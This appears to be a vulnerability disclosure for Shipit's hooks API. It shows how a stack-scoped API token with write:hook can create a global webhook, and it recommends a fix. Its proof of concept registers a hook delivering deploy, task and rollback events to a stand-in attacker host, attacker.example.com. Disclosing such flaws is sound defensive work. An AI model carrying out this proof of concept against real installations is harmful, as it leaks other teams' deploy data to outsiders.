### Title
Stack-scoped ApiClient can create a global Hook, exfiltrating deploy/task events for all stacks - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
`Shipit::ApiClient` supports being scoped to a single `stack_id` so that a token is only supposed to authorize operations on that one stack. However, `Api::HooksController#create` decides whether a created `Hook` is scoped or global purely based on whether a `:stack_id` **route/param** was present, not on whether the authenticated `current_api_client` is itself stack-scoped. This breaks the binding "stack a token authorizes == stack(s) whose data the token can touch."

### Finding Description
`ApiClient` can be scoped to a single stack via `belongs_to :stack, optional: true` and `stack_id` column [1](#0-0) . `Api::BaseController#stacks` enforces this scoping when a `stack_id` param is required to resolve a `Stack`: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [2](#0-1) . Permission enforcement for hooks, though, only checks whether the client's `permissions` array contains `write:hook`/`read:hook`, not whether the client is limited to a particular stack: `require_permission :write, :hook, only: %i[create update destroy]` -> `current_api_client.check_permissions!(operation, scope)` [3](#0-2) [4](#0-3) .

Crucially, `HooksController#stack_id` (used to scope the created/queried `Hook`) is derived only from the presence of the `:stack_id` request parameter, not from the api client's own stack binding:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [5](#0-4) 

`config/routes.rb` exposes both a stack-nested hooks resource (`/api/stacks/*stack_id/hooks`) and an unscoped, top-level one (`/api/hooks`) that share the same `HooksController`:
```ruby
scope '/stacks/*stack_id', ... do
  resources :hooks, only: %i[index create show update destroy]
end
...
resources :hooks, only: %i[index create show update destroy]
``` [6](#0-5) 

A `Hook` with `stack_id: nil` is a **global** hook that receives delivery for events across every stack, per `Hook.for_stack`/`Hook.deliver`:
```ruby
scope :global, -> { where(stack_id: nil) }
scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }
...
def self.deliver(event, stack_id, payload)
  for_stack(stack_id).listening_event(event).each { |hook| hook.deliver!(event, payload) }
end
``` [7](#0-6) 

Because `HooksController#create` uses the request param instead of `current_api_client.stack_id`/`current_api_client.stack_id?` to decide scoping, an `ApiClient` that is intentionally bound to a single stack (`stack_id` set, meaning it was only meant to interact with that stack) but which also carries the `write:hook` permission can simply call `POST /api/hooks` (the unscoped route, no `stack_id` param) instead of `POST /api/stacks/:stack_id/hooks`. Since `params[:stack_id]` is absent on that route, `stack_id` evaluates to `nil`, and `hooks.create(params)` creates a **global** `Hook` (`stack_id: nil`), which will receive delivery of `push`, `deploy`, `rollback`, `task`, etc. events for **every stack** in the installation — not just the one stack the token was authorized for.

### Impact Explanation
This crosses the "a stack a token authorizes versus a stack it touches" trust boundary called out in scope. A token deliberately restricted to one stack (e.g., issued to a third-party integration or CI system for `soc` stack only) can silently register a webhook receiver that gets fired for every deploy/task/rollback event across all stacks in the Shipit instance, exfiltrating deploy status, commit metadata, and task output URLs it was never authorized to see. This matches the "High - unauthenticated read of stack state, task streams or deploy output" impact bucket, since the token's stack authorization is bypassed to observe cross-stack deploy/task activity.

### Likelihood Explanation
Any actor holding a legitimate, narrowly-scoped `ApiClient` token (created via the normal `/api_clients` UI or `CCMenuUrlController`-style flows) that happens to include `write:hook` permission can trigger this with a single unauthenticated-beyond-their-own-token API call (`POST /api/hooks`) — no privilege escalation, no additional secrets, and no dependency on host misconfiguration. The only requirement is that the stack-scoped token include `write:hook`, which is a normal, documented permission combination (see `ApiClient::PERMISSIONS`) [8](#0-7) .

### Recommendation
In `Api::HooksController`, derive hook scoping from `current_api_client.stack_id` when the client is stack-bound, rejecting requests to the unscoped `/api/hooks` (or forcing `stack_id` to the client's bound stack) whenever `current_api_client.stack_id?` is true, mirroring the pattern already used in `BaseController#stacks`. Concretely, `HooksController#stack_id` should return `current_api_client.stack_id` (or reject the request) rather than depend solely on `params[:stack_id]` presence, ensuring a stack-scoped client can never create/read/update a global (`stack_id: nil`) hook.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack_id: <soc_stack_id>` with permissions `['read:stack', 'write:hook']` (analogous to fixture `here_come_the_walrus`, which is stack-scoped, but with `write:hook` added) [9](#0-8) .
2. Authenticate with this client's `authentication_token` via HTTP Basic auth against `POST /api/hooks` (the top-level, unscoped route defined at) [10](#0-9) , with body `{ delivery_url: 'https://attacker.example.com/hook', events: ['deploy', 'task', 'rollback'] }`.
3. `HooksController#create` computes `stack_id` as `nil` (because `params[:stack_id]` is absent on this route), so `Hook.where(stack_id: nil).create(params)` persists a **global** hook [11](#0-10) .
4. Any subsequent deploy/task/rollback event on **any** stack in the installation (not just `soc`) is delivered to `https://attacker.example.com/hook` via `Hook.deliver` [12](#0-11) , even though the `ApiClient` token was only supposed to be authorized for the `soc` stack.

Note: I was not able to fully trace every field included in each event's payload (e.g., whether `deploy`/`task` webhook payloads embed environment variable values) within the indexed portion of `app/models/shipit/task.rb`; the impact assessment above conservatively relies on cross-stack deploy/task/commit metadata exposure, which is already sufficient to meet the "unauthenticated read of stack state / deploy output" bar. A full review of payload contents would require inspecting the complete `emit_hooks`/`Hook.emit(:task, ...)` call sites in `app/models/shipit/task.rb`, which the current index only partially surfaced.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
